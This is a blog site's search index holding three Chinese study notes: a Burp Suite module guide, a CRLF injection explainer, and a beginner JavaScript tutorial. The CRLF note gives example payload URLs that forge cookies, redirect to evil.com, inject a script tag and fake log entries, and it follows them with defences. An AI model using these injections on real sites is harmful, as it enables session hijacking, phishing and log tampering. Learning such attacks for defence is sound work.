<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BurpSuit的使用</title>
    <url>/2025/02/05/BurpSuit%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="BurpSuit的使用"><a href="#BurpSuit的使用" class="headerlink" title="BurpSuit的使用"></a>BurpSuit的使用</h1><p> Burp Suite用于识别和利用Web应用程序中的漏洞</p>
<p>包括代理服务器、扫描器、入侵者、重复器、排序器、解码器（可以用于拦截和修改HTTP请求和响应，执行自动化漏洞扫描、暴力破解攻击等）</p>
<h2 id="代理模块-porxy"><a href="#代理模块-porxy" class="headerlink" title="代理模块(porxy)"></a>代理模块(porxy)</h2><p>拦截、修改HTTP&#x2F;HTTPS请求和响应</p>
<p>允许用户在发送到目标服务器之前手动修改请求内容（测试漏洞类型：跨站点脚本（XSS）和SQL注入）</p>
<h3 id="Intercept-拦截"><a href="#Intercept-拦截" class="headerlink" title="Intercept(拦截)"></a>Intercept(拦截)</h3><p>I允许用户拦截应用程序的HTTP和HTTPS请求，查看和修改请求，然后转发到目标服务器。使用Intercept，用户可以深入分析应用程序的请求和响应，并查找潜在的漏洞、快速验证漏洞的利用。  </p>
<p>首先我们要进行成功抓包，必须要将浏览器的流量包转移到burpsuit上</p>
<p>【安装SwitchyOmega（浏览器）,进行快速代理（创建一个Burp的情景模式，如下图）  or  把浏览器的流量转发到8080端口  】</p>
<img src="C:\Users\ASUS\Pictures\Screenshots\屏幕截图 2024-09-18 223740.png" style="zoom: 50%;" />

<h3 id="HTTP-history-HTTP请求历史"><a href="#HTTP-history-HTTP请求历史" class="headerlink" title="HTTP history(HTTP请求历史)"></a>HTTP history(HTTP请求历史)</h3><p>记录了所有被拦截的请求和响应，用户能查看和分析以前的请求和响应，可以使用过滤器来搜索特定请求和响应，轻松地查找和分析流量</p>
<h3 id="WebSockets-history"><a href="#WebSockets-history" class="headerlink" title="WebSockets history"></a>WebSockets history</h3><p>一般只有实时对话可以抓到</p>
<h3 id="Option选项"><a href="#Option选项" class="headerlink" title="Option选项"></a>Option选项</h3><p>![](C:\Users\ASUS\Pictures\Screenshots\屏幕截图 2024-09-18 224208.png)</p>
<p>配置Proxy监听的端口：将SwitchyOmega的代理服务器设置成与抓包的接口一样</p>
<h2 id="目标模块-Target"><a href="#目标模块-Target" class="headerlink" title="目标模块(Target)"></a>目标模块(Target)</h2><p>用于配置目标应用程序和Web站点信息的工具。在进行渗透测试或漏洞扫描时，可以使用此模块来确定攻击目标并设置代理以拦截流量</p>
<h3 id="Site-Map"><a href="#Site-Map" class="headerlink" title="Site Map"></a>Site Map</h3><p>提供对站点结构和内容，列出了站点的URL，以及每个URL的HTTP响应代码、请求和响应头信息以及其他参数</p>
<h2 id="扫描模块-Dashboard"><a href="#扫描模块-Dashboard" class="headerlink" title="扫描模块(Dashboard)"></a>扫描模块(Dashboard)</h2><p>执行自动化漏洞扫描，包括SQL注入、跨站脚本等多种漏洞</p>
<img src="C:\Users\ASUS\Pictures\Screenshots\屏幕截图 2024-09-18 222507.png" style="zoom:150%;" />

<p><img src="C:\Users\ASUS\Pictures\Screenshots\d4d1713c6ec7d881811dbb692f7638b6.png"></p>
<h2 id="响应模块-Repeater"><a href="#响应模块-Repeater" class="headerlink" title="响应模块(Repeater)"></a>响应模块(Repeater)</h2><p>显示请求和响应的详细信息，包括HTTP头和正文</p>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>复制请求：将已经发送的请求复制到Repeater中，方便进行重放和修改。<br>修改数据：可以对请求中的参数、请求方法、请求头等进行修改，从而快速定位漏洞点。<br>手动填写数据：可以手动填写参数数据，以便对应不同的测试场景。<br>发送请求：方便对修改后的请求进行重放，看响应是否符合预期。</p>
<h3 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h3><p><code>GET /index.php HTTP/1.1</code></p>
<p><code>Host: www.taeget.com</code></p>
<p><code>Upgrade-Insecure-Requests: 1</code></p>
<p><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</code></p>
<p><code>Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signedexchange;v=b3;q=0.9</code></p>
<p><code>Accept-Encoding: gzip, deflate</code></p>
<p><code>Accept-Language: zh-CN,zh;q=0.9</code></p>
<p><code>Connection: close</code></p>
<p><strong>请求行(请求方法、请求URL和HTTP协议版本)</strong></p>
<p>请求方法：常见的HTTP请求方法有GET（请求获取资源）、POST（提交表单数据）、PUT（更新资源）、DELETE（删除资源）</p>
<p>请求URL：&#x2F;index.php  (有时URL会省略)</p>
<p><strong>请求头部（包含了请求的各种附加信息，<code>  </code>如请求的主机、请求的用户代理、请求的内容类型等。Host头，User-Agent，Accept，Accept-Encoding，Accept-Language，Cookie）</strong></p>
<p><strong>请求体：有些请求需要传递数据，这些数据需要包含在请求体中，如POST请求就常常需要在请求体中传递表单数据</strong></p>
<h3 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h3><p><strong>状态行：状态行包含三个字段，分别是HTTP协议版本、状态码和状态消息</strong></p>
<p>状态码是指服务器返回的处理结果（200表示成功、404表示资源不存在、401表示未授权、30x表示跳转、302跳转漏洞、 50x表示服务器内部错误）</p>
<p><strong>响应头部：包含了响应的各种附加信息（响应的日期、响应的内容类型、响应的长度，响应Cookie）</strong></p>
<p><strong>响应体：包含了服务器返回的实际数据（HTML、JSON等格式的数据）</strong></p>
<h2 id="重复模块-Intruder"><a href="#重复模块-Intruder" class="headerlink" title="重复模块(Intruder)&lt;爆破&gt;"></a>重复模块(Intruder)&lt;爆破&gt;</h2><p>发送请求的多个副本，以测试目标服务器的响应是否相同（帮助用户确定目标应用程序是否容易受到重复攻击的影响）</p>
<h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>1.将不同类型的数据有效负载插入到Web应用程序中的参数中，并自动化地发起请求，以尝试发现应用程序中的任何漏洞或安全问题（使用Intruder来执行字典攻击、暴力破解或SQL注入等不同类型的攻击，以测试Web应用程序的安全性）<br>2.支持对多个目标同时进行攻击，从而提高测试效率。在攻击完成后，可以使用Burp Suite的其他模块来进一步分析攻击结果，并查找成功利用漏洞的可能性</p>
<h3 id="Positions（位置）"><a href="#Positions（位置）" class="headerlink" title="Positions（位置）"></a>Positions（位置）</h3><p>Intruder模块是通过$进行指定参数（username&#x3D;$xxx$意思就是将你的字典会去替换这个xxx的值）  </p>
<p>我们先去clear$ （清空当请求包发送到Intruder模块是自带的所有$），然后再通过add$ 进行添加变量值</p>
<h4 id="测试模式"><a href="#测试模式" class="headerlink" title="测试模式"></a>测试模式</h4><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250205101812433.png" style="zoom:200%;" />

<h5 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h5><p>（逐个地对每个目标参数进行测试，用于需要具体指定某个参数值进行测试的情况）</p>
<p>爆破单个位置，你指定哪就爆破哪（如不同的用户名，密码不变为1234560）</p>
<h5 id="Battering-Ram"><a href="#Battering-Ram" class="headerlink" title="Battering Ram"></a>Battering Ram</h5><p>（选择多个不同的参数值集合作为测试数据进行并行测试，以找出所有可能的漏洞点，适用于需要大量测试数据的情况）</p>
<p>指定多个位置 他只需要你一个字典文件，所有位置的参数一样</p>
<h5 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h5><p>同时对多个参数进行测试，将不同的参数组合在一起进行测试，适用于需要测试多个参数交互情况的情况</p>
<h5 id="Cluster-Bomb"><a href="#Cluster-Bomb" class="headerlink" title="Cluster Bomb"></a>Cluster Bomb</h5><p>似于Battering Ram，不同之处在于它将多个参数值集合作为测试数据，但会对每个参数集合都进行逐次的单元素组合测试，适用于需要详细测试每个参数值的情况</p>
<h2 id="Comparer模块"><a href="#Comparer模块" class="headerlink" title="Comparer模块"></a>Comparer模块</h2><p>比较来自两个HTTP请求或响应的数据，查找潜在漏洞或检测应用程序中的不良行为（如果对应用程序执行了两个相同的请求，但每次响应都略有不同，那么您可以使用比较模块来查看响应之间的差异并确定网站是否存在安全问题）</p>
<p>支持高级过滤器，在比较大型复杂响应时快速找到差异，将比较结果导出为文本文件以进行后续分析</p>
<h2 id="拓展模块"><a href="#拓展模块" class="headerlink" title="拓展模块"></a>拓展模块</h2><p>加载和管理Burp Suite的插件，以扩展其功能和特性（如目录枚举、暴力破解、漏洞检测、代理服务器）</p>
]]></content>
      <categories>
        <category>BurpSuit</category>
      </categories>
  </entry>
  <entry>
    <title>CRLF漏洞</title>
    <url>/2025/02/07/CRLF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h1><p><strong>CRLF（Carriage Return + Line Feed，回车 + 换行）</strong>，是 <code>\r\n</code> 的组合，表示文本换行</p>
<p><code>\r\n</code>进行URL编码变成<code>%0D%0A</code></p>
<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>在输入中插入 <code>\r\n</code>，改变 HTTP 头部或 HTML 页面结构，进而实现 <strong>XSS、HTTP 响应拆分（HTTP Response Splitting）、Web 伪造攻击</strong></p>
<h3 id="HTTP响应拆分"><a href="#HTTP响应拆分" class="headerlink" title="HTTP响应拆分"></a>HTTP响应拆分</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>服务器在响应 HTTP 头时，通常会使用 <code>\r\n</code> 作为分隔符</p>
<p>如果攻击者可以在 <strong>URL 或请求头</strong>中注入 <code>\r\n</code>，就可能 <strong>伪造 HTTP 头部或插入恶意内容</strong></p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者构造请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0ASet-Cookie:%20admin=true</span><br></pre></td></tr></table></figure>

<p>服务器返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=admin</span><br><span class="line">Set-Cookie: admin=true  &lt;-- 攻击者成功伪造 Cookie</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>攻击者成功伪造cookie，可能绕过身份验证，可以用于会话劫持、钓鱼攻击等</strong></p>
<p><strong>其可与<code>location</code>头结合进行重定向</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?username=%0D%0ALocation:%20https://evil.com%0D%0A</span><br></pre></td></tr></table></figure>

<p>可能导致服务器返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Set-Cookie: user=</span><br><span class="line">Location: https://evil.com   &lt;-- 伪造重定向</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;Welcome!&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>用户被恶意跳转到<code>evil.com</code></p>
<h3 id="CRLF与XSS结合"><a href="#CRLF与XSS结合" class="headerlink" title="CRLF与XSS结合"></a>CRLF与XSS结合</h3><p>攻击者构造请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0AContent-Length:%200%0D%0A%0D%0A&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>服务器返回：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 0  &lt;-- 伪造的 Content-Length</span><br><span class="line">                              </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;  &lt;-- XSS 代码被执行</span><br></pre></td></tr></table></figure>

<h3 id="CRLF-造成日志伪造"><a href="#CRLF-造成日志伪造" class="headerlink" title="CRLF 造成日志伪造"></a>CRLF 造成日志伪造</h3><p>很多 Web 服务器会将请求参数写入日志，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: test</span><br></pre></td></tr></table></figure>

<p>如果攻击者输入 <code>\r\n</code>，可能伪造日志内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://example.com/page?param=%0D%0A%5BWARNING%5D%20Security%20Breach!</span><br></pre></td></tr></table></figure>

<p>服务器日志可能变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[INFO] 2025-02-07 12:00:00 - User input: </span><br><span class="line">[WARNING] Security Breach!</span><br></pre></td></tr></table></figure>

<p><strong>攻击者可以伪造系统日志，可能隐藏攻击痕迹、制造假警报等</strong></p>
<h2 id="防御-CRLF-注入"><a href="#防御-CRLF-注入" class="headerlink" title="防御 CRLF 注入"></a>防御 CRLF 注入</h2><h3 id="过滤用户输入，移除-r-n"><a href="#过滤用户输入，移除-r-n" class="headerlink" title="过滤用户输入，移除 \r\n"></a>过滤用户输入，移除 <code>\r\n</code></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userInput = userInput.replace(/[\r\n]/g, &quot;&quot;);  // 删除 CRLF</span><br></pre></td></tr></table></figure>

<h3 id="对-URL-参数进行编码"><a href="#对-URL-参数进行编码" class="headerlink" title="对 URL 参数进行编码"></a>对 URL 参数进行编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURIComponent(userInput);</span><br></pre></td></tr></table></figure>

<h3 id="设置-HTTP-头安全策略"><a href="#设置-HTTP-头安全策略" class="headerlink" title="设置 HTTP 头安全策略"></a>设置 HTTP 头安全策略</h3><p>启用 <code>CSP</code> ，<strong>只允许同源（self）资源加载</strong>（内嵌 HTML（非 JS 或 CSS）），阻止外部资源加载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-头中使用安全-API"><a href="#HTTP-头中使用安全-API" class="headerlink" title="HTTP 头中使用安全 API"></a>HTTP 头中使用安全 API</h3><p>在 <code>setHeader()</code> 时避免拼接用户输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.setHeader(&quot;Set-Cookie&quot;, `user=$&#123;encodeURIComponent(username)&#125;`);</span><br></pre></td></tr></table></figure>

<h3 id="确保日志安全"><a href="#确保日志安全" class="headerlink" title="确保日志安全"></a>确保日志安全</h3><p>使用 <code>JSON.stringify()</code> 记录日志，防止换行</p>
<p>避免直接写入用户输入</p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript</title>
    <url>/2024/10/15/JavaScript/</url>
    <content><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><p>HTML 中的 Javascript 脚本代码必须位于 <code>&lt;script&gt;</code> 与 <strong><code>&lt;/script&gt;</code></strong> 标签间</p>
<p>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <strong><code>&lt;head&gt;</code></strong> 中</p>
<h2 id="JavaScript-输出"><a href="#JavaScript-输出" class="headerlink" title="JavaScript 输出"></a>JavaScript 输出</h2><p>JavaScript 没有任何打印或者输出的函数</p>
<h3 id="使用-window-alert-弹出警告框来显示数据"><a href="#使用-window-alert-弹出警告框来显示数据" class="headerlink" title="使用 window.alert() 弹出警告框来显示数据"></a>使用 <strong>window.alert()</strong> 弹出警告框来显示数据</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117433.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117434.png"></p>
<h3 id="使用-innerHTML-写入到-HTML-元素"><a href="#使用-innerHTML-写入到-HTML-元素" class="headerlink" title="使用 innerHTML 写入到 HTML 元素"></a>使用 <strong>innerHTML</strong> 写入到 HTML 元素</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117435.png"></p>
<p><strong>document.getElementById(“demo”)</strong> 用 id 属性(标识 HTML 元素)来查找 HTML 元素的 JS 代码 </p>
<p>**innerHTML &#x3D; “段落已修改。”**用于修改元素的 HTML 内容(innerHTML)的JS 代码</p>
<h3 id="使用-document-write-方法将内容写到-HTML-文档中"><a href="#使用-document-write-方法将内容写到-HTML-文档中" class="headerlink" title="使用 document.write() 方法将内容写到 HTML 文档中"></a>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117437.png"></p>
<p>用 document.write() 可以向文档写入内容。</p>
<p>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117438.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117439.png" alt="屏幕截图 2024-10-05 110900"></p>
<h3 id="使用-console-log-写入到浏览器的控制台"><a href="#使用-console-log-写入到浏览器的控制台" class="headerlink" title="使用 console.log() 写入到浏览器的控制台"></a>使用 <strong>console.log()</strong> 写入到浏览器的控制台</h3><p>使用 <strong>console.log()</strong> 方法在浏览器中( F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单)显示 JavaScript 值</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117440.png"></p>
<h2 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h2><h3 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h3><p><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)【123e5&#x3D;12300000】</p>
<p><strong>字符串（String）字面量</strong> 可以使用单引号或双引号</p>
<p><strong>表达式字面量</strong> 用于计算</p>
<p><strong>数组（Array）字面量</strong> 定义一个数组 [40, 100, 1, 5, 25, 10]</p>
<p><strong>对象（Object）字面量</strong> 定义一个对象 {firstName:”John”, lastName:”Doe”, age:50, eyeColor:”blue”}</p>
<p><strong>函数（Function）字面量</strong> 定义一个函数  function myFunction(a, b) { return a * b;}</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量用于存储数据值，使用关键字 <strong>var</strong> 来定义变量， 使用等号来为变量赋值</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117441.png"></p>
<h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>用于向浏览器发出命令（详见下节）</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>数字，字符串，数组，对象等</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h2 id="JavaScript-语句"><a href="#JavaScript-语句" class="headerlink" title="JavaScript 语句"></a>JavaScript 语句</h2><p>JavaScript 语句是发给浏览器的命令，告诉浏览器要做的事情</p>
<h3 id="分号"><a href="#分号" class="headerlink" title="分号 ;"></a>分号 ;</h3><p>在每条可执行的语句结尾添加分号或在一行中编写多条语句</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117442.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>是 JavaScript 语句的序列。浏览器按照编写顺序依次执行每条语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;demo&quot;).innerHTML=&quot;你好 Dolly&quot;; document.getElementById(&quot;myDIV&quot;).innerHTML=&quot;你最近怎么样?&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>代码块的作用是一并地执行语句序列，左花括号开始，以右花括号结束</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117443.png" alt="屏幕截图 2024-10-05 155144"></p>
<h3 id="语句标识符"><a href="#语句标识符" class="headerlink" title="语句标识符"></a>语句标识符</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117444.png"></p>
<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>JavaScript 会忽略多余的空格</p>
<h3 id="折行"><a href="#折行" class="headerlink" title="折行"></a>折行</h3><p>使用反斜杠对代码行进行换行</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117445.png"></p>
<h2 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h2><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>用 var 关键词来声明变量，变量可以先使用再声明</p>
<h4 id="多变量"><a href="#多变量" class="headerlink" title="多变量"></a>多变量</h4><p>在一条语句中声明很多变量：该语句以 var 开头，并使用逗号分隔变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lastname=&quot;Doe&quot;, age=30, job=&quot;carpenter&quot;;</span><br></pre></td></tr></table></figure>

<p>横跨多行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lastname=&quot;Doe&quot;,</span><br><span class="line">age=30,</span><br><span class="line">job=&quot;carpenter&quot;;</span><br></pre></td></tr></table></figure>

<p>一条语句中声明的多个变量不可以同时赋同一个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x,y,z=1;</span><br></pre></td></tr></table></figure>

<p>x,y 为 undefined， z 为 1。</p>
<h4 id="重新声明变量"><a href="#重新声明变量" class="headerlink" title="重新声明变量"></a>重新声明变量</h4><p>重新声明 JavaScript 变量，该变量的值不会丢失</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var carname=&quot;Volvo&quot;;</span><br><span class="line">var carname;</span><br></pre></td></tr></table></figure>

<p>两条语句执行后，变量 carname 的值依然是 “Volvo”</p>
<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>JavaScript 变量可用于存放值（ x&#x3D;5），表达式（z&#x3D;x+y）和文本值 (name&#x3D;”Bill Gates”  用双引号或单引号包围这个值)，一般倡导以字母开头</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117446.png"></p>
<h2 id="JavaScript-数据类型"><a href="#JavaScript-数据类型" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h2><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol</p>
<p><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）</p>
<p>变量的数据类型可以使用 <strong>typeof</strong> 操作符来查看</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117447.png"></p>
<h3 id="JavaScript-数组"><a href="#JavaScript-数组" class="headerlink" title="JavaScript 数组"></a>JavaScript 数组</h3><p>JavaScript 不支持使用名字来索引数组，只允许使用数字索引</p>
<p>如果你使用名字作为索引，当访问数组时，JavaScript 会把数组重新定义为标准对象。</p>
<p>执行这样操作后，数组的方法及属性将不能再使用，否则会产生错误（person.length输出为0）</p>
<p>使用 <strong><code>new Array()</code></strong> 构造函数，通过 <strong><code>.length</code></strong> 获取数组长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var cars=new Array();</span><br><span class="line">cars[0]=&quot;Saab&quot;;</span><br><span class="line">cars[1]=&quot;Volvo&quot;;</span><br><span class="line">cars[2]=&quot;BMW&quot;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var cars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117448.png"></p>
<h2 id="JavaScript-对象"><a href="#JavaScript-对象" class="headerlink" title="JavaScript 对象"></a>JavaScript 对象</h2><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义</p>
<h3 id="对象属性两种访问方式"><a href="#对象属性两种访问方式" class="headerlink" title="对象属性两种访问方式"></a>对象属性两种访问方式</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117449.png"></p>
<h3 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h3><p>对象的方法定义了一个函数，并作为对象的属性存储。对象方法通过添加 () 调用 (作为一个函数)。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117450.png"></p>
<h3 id="typeof，Undefined-和-Null"><a href="#typeof，Undefined-和-Null" class="headerlink" title="typeof，Undefined 和 Null"></a>typeof，Undefined 和 Null</h3><p>typeof 操作符来检测变量的数据类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typeof &quot;John&quot;         // 返回 string</span><br><span class="line">typeof 3.14          // 返回 number</span><br><span class="line">typeof NaN           // 返回 number</span><br><span class="line">typeof false         // 返回 boolean</span><br><span class="line">typeof [1,2,3,4]       // 返回 object</span><br><span class="line">typeof &#123;name:&#x27;John&#x27;, age:34&#125; // 返回 object</span><br><span class="line">typeof new Date()       // 返回 object</span><br><span class="line">typeof function () &#123;&#125;     // 返回 function</span><br><span class="line">typeof myCar         // 返回 undefined (如果 myCar 没有声明)</span><br><span class="line">typeof null          // 返回 object</span><br></pre></td></tr></table></figure>

<p>Undefined 这个值表示变量不含有值。任何变量都可以通过设置值为 <strong>undefined</strong> 来清空</p>
<p>null 表示 “什么都没有”，但类型为<strong>对象</strong>，是一个<strong>只有一个值的特殊类型</strong>。表示一个空对象引用。可以设置为 null 来清空变量。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117451.png"></p>
<p>在常规的比较&#x3D;&#x3D;中，数据类型是被忽略的</p>
<p>在严格的比较运算中，&#x3D;&#x3D;&#x3D; 为恒等计算符，同时检查表达式的值与类型</p>
<h2 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h2><h3 id="调用带参数的函数"><a href="#调用带参数的函数" class="headerlink" title="调用带参数的函数"></a>调用带参数的函数</h3><p>变量和参数必须以一致的顺序出现（第一个变量就是第一个被传递的参数的给定的值）</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117452.png"></p>
<h3 id="带有返回值的函数"><a href="#带有返回值的函数" class="headerlink" title="带有返回值的函数"></a>带有返回值的函数</h3><p>使用 return 语句时，函数会停止执行，并返回指定的值</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117453.png"></p>
<h2 id="JavaScript-作用域"><a href="#JavaScript-作用域" class="headerlink" title="JavaScript 作用域"></a>JavaScript 作用域</h2><p><strong>作用域为可访问变量，对象，函数的集合</strong></p>
<h3 id="JavaScript-局部作用域"><a href="#JavaScript-局部作用域" class="headerlink" title="JavaScript 局部作用域"></a>JavaScript 局部作用域</h3><p>局部变量：只能在函数内部访问，局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁，不同的函数可以使用相同名称的变量</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117454.png"></p>
<h3 id="JavaScript-全局变量"><a href="#JavaScript-全局变量" class="headerlink" title="JavaScript 全局变量"></a>JavaScript 全局变量</h3><p>全局变量有 <strong>全局作用域</strong>: 网页中所有脚本和函数均可使用</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117455.png"></p>
<p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117456.png"></p>
<h2 id="JavaScript-字符串"><a href="#JavaScript-字符串" class="headerlink" title="JavaScript 字符串"></a>JavaScript 字符串</h2><p>JavaScript 字符串用于存储和处理文本</p>
<p>字符串的索引从 0 开始，这意味着第一个字符索引值为 **[0]**，第二个为 **[1]**，以此类推</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117457.png"></p>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>反斜杠是一个<strong>转义字符</strong>。 转义字符将特殊字符转换为字符串字符</p>
<p>例如：可以在字符串中使用引号，字符串中的引号不要与字符串的引号相同（但可以在字符串添加转义字符来使用引号）</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117458.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117459.png"></p>
<h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><p>使用内置属性 <strong>length</strong> 来计算字符串的长度</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117460.png"></p>
